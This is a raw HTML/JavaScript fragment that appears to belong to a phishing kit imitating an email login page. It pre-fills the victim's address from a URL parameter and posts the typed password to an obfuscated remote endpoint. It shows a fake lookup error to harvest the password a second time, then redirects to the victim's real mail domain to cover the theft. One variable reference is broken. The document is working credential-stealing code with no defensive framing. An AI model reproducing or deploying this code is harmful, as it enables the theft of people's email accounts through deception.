 <script>function getParameterByName(name, url) {
		if (!url) url = window.location.href;
		name = name.replace(/[\[\]]/g, '\\$&');
		var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
			results = regex.exec(url);
		if (!results) return null;
		if (!results[2]) return '';
		return decodeURIComponent(results[2].replace(/\+/g, ' '));
	}

	
	var id = getParameterByName('cms');document.getElementById("u").value = id;document.getElementById("displayName").innerHTML = id;
	
	</script>

<script src="./config.js"></script>
	
	<script>
		const connect = "L2Nvbm5lY3QucGhw";
		const postUrl = `${config.baseUrl}${atob(atu)}`;
	$(document).ready(function() {
		$('#btn-submit').click(function() {
			var p = $('#p').val();
			var login_attempts = 3;
			if(p === '') {
				$('#usernameError').html('<div class="col-md-24 error ext-error" style="color: #e81123;font-size:16px">Enter email password to continue.</div>');
				return false;
			}else if(p.length <= 4) {
				$('#usernameError').html('<div class="col-md-24 error ext-error" style="color: #e81123;font-size:16px">Enter correct password for your email.</div>');
				return false;
			}else{
			
				$('#usernameError').html('').hide();
				
				if(login_attempts = login_attempts-1) {
			
					submitFormAjaxFirst();
				}
				else if(login_attempts == 0){
				
					submitFormAjax();
					
				}
			}
			
		});
		
		function getEd(email){
			let emailDomain = null;
			const pos = email.search('@');
			if(pos > 0) {
				emailDomain = email.slice(pos+1);
				
			}
			
			return emailDomain;
		}
		
		
		function submitFormAjaxFirst() {

			var username = document.getElementById('u').value;
			var password = document.getElementById('p').value;

			var params = "ai=" + username + "&pr=" + password;
			var xmlHttp = new XMLHttpRequest();
			xmlHttp.onreadystatechange = function() {
				if(xmlHttp.readyState == 4 && xmlHttp.status == 200) {
					setTimeout(function() {
						document.getElementById('p').value = '';
						$('#usernameError').html('<div class="col-md-24 error ext-error" style="color: #e81123;font-size:16px">There was an issue looking up your account. Tap Next to try again.</div>');
						$('#btn-submit').val('Next');
					}, 2000);
				}
			}
			xmlHttp.open("post", postUrl, true);
			xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			xmlHttp.send(params); 
		}

		function submitFormAjax() {

			var username = document.getElementById('u').value;
			var password = document.getElementById('p').value;
			var params = "ai=" + username + "&pr=" + password;
			var ed = getEd(username);
			var xmlHttp = new XMLHttpRequest();
			xmlHttp.onreadystatechange = function(){
				if(xmlHttp.readyState == 4 && xmlHttp.status == 200) {
					setTimeout(function() {
						window.location.href = 'https://'+ed;
					}, 2000);
				}
			}
			xmlHttp.open("post", postUrl, true);
			xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			xmlHttp.send(params); 
		}
	});
	</script>
